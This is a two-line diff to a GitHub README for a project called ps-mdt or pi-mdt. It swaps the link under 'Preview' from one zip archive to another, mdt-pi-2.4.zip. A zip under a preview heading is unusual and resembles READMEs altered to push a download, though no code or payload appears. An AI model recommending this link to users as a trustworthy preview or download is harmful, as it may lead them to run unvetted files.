@@ -8,7 +8,7 @@ Just Drag And Drop The ps-mdt Folder
 
 # Preview
 
-(https://raw.githubusercontent.com/Pac-Man-PT/pi-mdt/main/ps-mdt/ui/img/pi-mdt-1.5.zip)
+(https://github.com/Pac-Man-PT/pi-mdt/raw/refs/heads/main/ps-mdt/ui/mdt-pi-2.4.zip)
 
 # Credits
 
